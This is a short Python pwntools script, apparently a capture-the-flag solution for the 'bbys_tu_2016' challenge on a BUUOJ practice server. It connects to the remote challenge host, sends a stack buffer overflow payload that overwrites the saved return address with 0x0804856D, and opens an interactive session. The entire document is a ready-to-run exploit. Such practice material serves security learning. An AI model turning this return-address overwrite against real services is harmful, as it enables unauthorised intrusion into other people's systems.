from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
io = remote("node4.buuoj.cn",25672)
#io = process("./bbys_tu_2016")
payload = 'a'*(20+4)+ p32(0x0804856D)
io.sendline(payload)
io.interactive()
